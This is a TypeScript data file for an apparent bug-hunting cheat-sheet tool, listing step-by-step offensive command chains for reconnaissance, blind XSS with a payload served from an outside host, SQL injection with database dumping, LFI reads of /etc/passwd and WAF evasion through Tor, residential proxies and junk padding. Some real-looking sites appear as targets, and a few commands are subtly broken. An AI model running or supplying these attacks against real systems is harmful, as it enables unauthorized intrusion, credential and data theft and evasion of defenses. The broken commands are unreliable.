import { AdvancedMethodology } from '../../types';

// ============================================
// STEP-BY-STEP METHODOLOGIES
// ============================================

export const methodologies: AdvancedMethodology[] = [
    {
        id: 'bug-hunting-methodology',
        title: 'Complete Bug Hunting Workflow',
        commands: [
            {
                name: 'Step 1: Subdomain Discovery',
                command: [
                    `subfinder -d example.com -all -recursive > subdomains.txt`,
                    `cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt`
                ],
                description: 'Find and filter live subdomains.'
            },
            {
                name: 'Step 2: URL Collection',
                command: [
                    `katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt`
                ],
                description: 'Collect all URLs from subdomains.'
            },
            {
                name: 'Step 3: Sensitive File Detection',
                command: [
                    `cat allurls.txt | grep -E "\\.txt|\\.log|\\.cache|\\.secret|\\.db|\\.backup|\\.yml|\\.json|\\.gz|\\.rar|\\.zip|\\.config"`,
                    `cat allurls.txt | grep -E "\\.js$" >> js.txt`
                ],
                description: 'Find sensitive files and JavaScript files.'
            },
            {
                name: 'Step 4: JS Analysis',
                command: [
                    `cat js.txt | nuclei -t /nuclei-templates/http/exposures/`,
                    `echo www.example.com | katana -ps | grep -E "\\.js$" | nuclei -t /nuclei-templates/http/exposures/ -c 30`
                ],
                description: 'Analyze JavaScript files for secrets.'
            },
            {
                name: 'Step 5: Directory Bruteforce',
                command: [
                    `dirsearch -u https://www.example.com -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,lock,log,rar,old,sql,sql.gz,sql.zip,swp,tar,tar.bz2,tar.gz,txt,wadl,zip`
                ],
                description: 'Bruteforce directories and files.'
            },
            {
                name: 'Step 6: XSS Hunting',
                command: [
                    `subfinder -d example.com | httpx-toolkit -silent | katana -ps -f qurl | gf xss | bxss -appendMode -payload '"><script src=https://xss.report/c/coffinxp></script>' -parameters`
                ],
                description: 'Hunt for XSS vulnerabilities.'
            },
            {
                name: 'Step 7: Subdomain Takeover',
                command: [
                    `subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl`
                ],
                description: 'Check for subdomain takeover.'
            },
            {
                name: 'Step 8: CORS Check',
                command: [
                    `python3 corsy.py -i /home/coffinxp/vaitor/subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\\nCookie: SESSION=Hacked"`,
                    `nuclei -list subdomains_alive.txt -t /nuclei-templates/http/vulnerabilities/generic/cors-misconfig.yaml`
                ],
                description: 'Check for CORS misconfigurations.'
            },
            {
                name: 'Step 9: Vulnerability Scanning',
                command: [
                    `nuclei -list subdomains_alive.txt -tags cve,osint,tech`,
                    `cat allurls.txt | gf lfi | nuclei -tags lfis`,
                    `cat allurls.txt | gf redirect | openredirex -p /home/whiterose/openRedirect`
                ],
                description: 'Run vulnerability scans using Nuclei.'
            }
        ]
    },
    {
        id: 'sqli-methodology',
        title: 'SQL Injection Testing Guide',
        commands: [
            {
                name: 'Step 1: Find SQL-Prone URLs',
                command: [
                    `echo https://example.com | gau | uro | grep -E ".php|.asp|.aspx|.jspx|.jsp" | grep "=" >urls1.txt`,
                    `echo https://example.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | uro | grep -E ".php|.asp|.aspx|.jspx|.jsp" >urls2.txt`
                ],
                description: 'Collect URLs with potential SQL parameters.'
            },
            {
                name: 'Step 2: Filter SQLi Parameters',
                command: [
                    `cat urls1.txt urls2.txt | gf sqli | uro > cleaned-sql.txt`
                ],
                description: 'Use gf to extract SQL injection prone endpoints.'
            },
            {
                name: 'Step 3: Automate Testing',
                command: [
                    `ghauri -m cleaned-sql.txt --batch --dbs --level 3 --confirm`,
                    `sqlmap -m cleaned-sql.txt --batch --random-agent --tamper=space2comment --level=5 --risk=3 --drop-set-cookie --threads 10 --dbs`
                ],
                description: 'Run automated SQL injection testing.'
            },
            {
                name: 'LostSec Tool (Single URL)',
                command: [
                    `python3 lostsec.py -u "https://cutm.ac.in/payu/skill/index.php?id=34" -p payloads/xor.txt -t 5`
                ],
                description: 'Test single URL with LostSec tool.'
            },
            {
                name: 'LostSec Tool (Multiple URLs)',
                command: [
                    `paramspider -d www.speedway.net.au -o urls.txt`,
                    `cat output/urls.txt | sed 's/FUZZ//g' >final.txt`,
                    `python3 lostsec.py -1 final.txt -p payloads/xor.txt -t 5`
                ],
                description: 'Test multiple URLs with LostSec tool.'
            }
        ]
    },
    {
        id: 'xss-methodology',
        title: 'XSS Hunting Guide',
        commands: [
            {
                name: 'Step 1: Collect XSS Parameters',
                command: ['echo example.com | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt'],
                description: 'Collect potential XSS vulnerable parameters.'
            },
            {
                name: 'Step 2: Refine Results',
                command: [`cat xss_output.txt | grep -oP '^URL: \\K\\S+' | sed 's/=.*/=/' | sort -u > final.txt`],
                description: 'Clean and filter XSS results.'
            },
            {
                name: 'Step 3: Exploit with LOXS',
                command: [`python3 loxs.py`],
                description: 'Final exploitation with LOXS tool from github.com/coffinxp.'
            },
            {
                name: 'XSS and SSRF Headers Test',
                command: [
                    `cat domains.txt | assetfinder --subs-only| httprobe | while read url; do xss1=$(curl -s -L $url -H 'X-Forwarded-For: xss.yourburpcollabrotor'|grep xss) xss2=$(curl -s -L $url -H 'X-Forwarded-Host: xss.yourburpcollabrotor'|grep xss) xss3=$(curl -s -L $url -H 'Host: xss.yourburpcollabrotor'|grep xss) xss4=$(curl -s -L $url --request-target http://burpcollaborator/ --max-time 2); echo -e '\\e[1;32m$url\\e[0m''\\n''Method[1] X-Forwarded-For: xss+ssrf => $xss1''\\n''Method[2] X-Forwarded-Host: xss+ssrf ==> $xss2''\\n''Method[3] Host: xss+ssrf ==> $xss3''\\n''Method[4] GET http://xss.yourburpcollabrotor HTTP/1.1 ''\\n';done'`
                ],
                description: 'Test XSS and SSRF via HTTP headers.'
            }
        ]
    },
    {
        id: 'lfi-methodology',
        title: 'Directory Traversal Hunting',
        commands: [
            {
                name: 'Step 1: Collect LFI Parameters',
                command: [
                    `subfinder -d exapmle.com | httpx-toolkit | gau | uro | gf lfi | tee subdomains.txt`
                ],
                description: 'Find URLs with potential LFI parameters.'
            },
            {
                name: 'Step 2: Nuclei LFI Scan',
                command: [
                    `nuclei -l subdomains.txt -tags lfi`,
                    `nuclei -target 'https://example.com/home.php?page=about.php' -tags lfi`
                ],
                description: 'Run Nuclei LFI templates.'
            },
            {
                name: 'Step 3: Manual LFI Testing',
                command: [
                    `echo 'https://example.com/' | gau | uro | gf lfi`,
                    `dotdotpwn -m http-url -d 1- -f /etc/passwd -u "https://example.com/index.php?ajax.php?page=TRAVERSAL" -b -k "root:"`
                ],
                description: 'Manual LFI verification.'
            },
            {
                name: 'LFI One-Liner Validation',
                command: [
                    `subfinder -d example.com | httpx-toolkit | gau | uro | gf lfi | gsreplace | "/etc/passwd" | while read url ; do curl -silent | "$url" | grep "root:x:" && echo "$url is vulnerable"; done;`
                ],
                description: 'Automated LFI validation.'
            },
            {
                name: 'ParamSpider for LFI',
                command: [
                    `paramspider -d example.com --subs`,
                    `dotdotpwn -m http-url -d 1- -f /etc/passwd -u "https://example.com/index.php?ajax.php?page=TRAVERSAL" -b -k "root:"`
                ],
                description: 'Use ParamSpider to find LFI parameters.'
            }
        ]
    },
    {
        id: 'nuclei-templates',
        title: 'Nuclei Template Usage',
        commands: [
            {
                name: 'CRLF Injection',
                command: [`subfinder -d example.com -all | nuclei -t /nuclei-templates/crlf.yaml -rl 50`],
                description: 'Scan for CRLF injection.'
            },
            {
                name: 'Open Redirect',
                command: [`subfinder -d example.com -all | nuclei -t /nuclei-templates/openRedirect.yaml -rl 100`],
                description: 'Scan for open redirects.'
            },
            {
                name: 'IIS Vulnerabilities',
                command: [`subfinder -d example.com -all | nuclei -t /nuclei-templates/iis.yaml`],
                description: 'Scan for IIS specific vulnerabilities.'
            },
            {
                name: 'CORS Misconfiguration',
                command: [`subfinder -d example.com -all | nuclei -t /nuclei-templates/cors.yaml -rl 100`],
                description: 'Scan for CORS misconfigurations.'
            },
            {
                name: 'SQL Injection Errors',
                command: [`subfinder -d example.com -all | waybackurls | gf sqli | uro | nuclei -t /nuclei-templates/errsqli.yaml -rl 50`],
                description: 'Scan for SQL injection error messages.'
            },
            {
                name: 'RCE One-Liner',
                command: [`cat targets.txt | httpx -path "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id" -nc -ports 80,443,8080,8443 -mr "uid=" -silent`],
                description: 'Quick RCE check.'
            }
        ]
    },
    {
        id: 'waf-bypass-methodology',
        title: 'WAF Bypass & SQLi Exploitation Guide',
        commands: [
            {
                name: 'Step 1: Basic SQLMap Scan',
                command: [
                    `sqlmap -u "https://target.com/page.php?id=1" --dbs --batch`,
                    `sqlmap -r request.txt --level 5 --risk 3 --batch --dbs`
                ],
                description: 'Start with basic SQLMap testing. Use -r for Burp request files (POST/Headers).'
            },
            {
                name: 'Step 2: BULK URLs Testing',
                command: [
                    `sqlmap -m urls.txt --batch --random-agent --tamper=space2comment --level=5 --risk=3 --drop-set-cookie --threads 10 --dbs`
                ],
                description: 'Test multiple URLs from a text file in one automated run.'
            },
            {
                name: 'Step 3: Tamper Scripts for WAF Bypass',
                command: [
                    `sqlmap -u "url" --tamper=space2comment,between,randomcase --dbs --batch`,
                    `sqlmap -u "url" --tamper=charencode,equaltolike --dbs --batch`,
                    `sqlmap -u "url" --tamper=apostrophemask,base64encode --dbs --batch`
                ],
                description: 'Use tamper scripts to bypass WAF filtering. Reference: github.com/coffinxp/payloads for full cheatsheet.'
            },
            {
                name: 'Step 4: Tor & Proxy Mode',
                command: [
                    `sqlmap -r request.txt --time-sec=10 --tor --tor-type=SOCKS5 --dbs --batch`,
                    `sqlmap -r request.txt --proxy http://127.0.0.1:8080 --random-agent --dbs --batch`
                ],
                description: 'Route traffic through Tor or Burp proxy to evade IP-based blocking.'
            },
            {
                name: 'Step 5: JSON-Based SQL Injection',
                command: [
                    `sqlmap -u 'https://api.target.com/login' --data '{"User":"admin","Pwd":"admin@123"}' --random-agent --ignore-code 403 --dbs --hex`
                ],
                description: 'Test JSON APIs with hex-encoded payloads, ignore 403 responses.'
            },
            {
                name: 'Step 6: Ghauri Basic Scan',
                command: [
                    `ghauri -u "https://target.com/page.php?id=1" --dbs --batch`,
                    `ghauri -r request.txt -p user_id --dbs --batch --level 3`
                ],
                description: 'Ghauri is optimized for blind/time-based and cloud WAFs (Cloudflare, Akamai).'
            },
            {
                name: 'Step 7: Ghauri WAF Evasion',
                command: [
                    `ghauri -u 'url' --batch --dbs --level 3 --dbms mysql --confirm --time-sec 10 --delay 5`,
                    `ghauri -u 'url' --prefix "')/**/" --suffix "--+" --skip-urlencode --dbs --batch`
                ],
                description: 'Use delay, confirm, and custom prefix/suffix for WAF evasion.'
            },
            {
                name: 'Step 8: Ghauri with ProxyChains',
                command: [
                    `proxychains ghauri -u "url" -p param --batch --dbs --confirm --level 3 --time-sec 10`
                ],
                description: 'Use residential proxies for better WAF bypass success rate.'
            },
            {
                name: 'Step 9: Fortinet WAF Bypass (Junk Data)',
                command: [
                    `ghauri --data "junk=asd...x1000...asd&recover=1&user=admin*" --url https://target.com/login.php --dbs --batch`
                ],
                description: 'Send >1KB junk data to exceed WAF inspection limits (Cloudflare: 128KB, AWS: 8-64KB, Akamai: 8-128KB).'
            },
            {
                name: 'Step 10: Find Origin IP',
                command: [
                    `shodan search 'ssl.cert.subject.CN:"target.com"'`,
                    `# Add to /etc/hosts: <origin_ip> target.com`,
                    `ghauri -u 'http://<origin_ip>/vuln.php' --dbs --batch`
                ],
                description: 'Bypass WAF by finding origin IP via FOFA/Shodan and testing directly.'
            },
            {
                name: 'Database Enumeration',
                command: [
                    `--dbs  # List all databases`,
                    `-D database_name --tables  # List tables`,
                    `-D database_name -T users --columns  # List columns`,
                    `-D database_name -T users -C user,pass --dump  # Dump data`
                ],
                description: 'Enumerate and extract database contents after finding injection.'
            },
            {
                name: 'Pro Tips',
                command: [
                    `# Always test with BOTH SQLMap and Ghauri`,
                    `# SQLMap: Use --hex and proxychains with residential IPs`,
                    `# Ghauri: Use --confirm and --level 3 for cloud WAFs`,
                    `# Use --delay 5 --timeout 20 --retries 5 for stealth`,
                    `# Try --ignore-code to skip 401/403 responses`
                ],
                description: 'Best practices for WAF bypass - sometimes one tool succeeds where the other fails.'
            }
        ]
    }
];
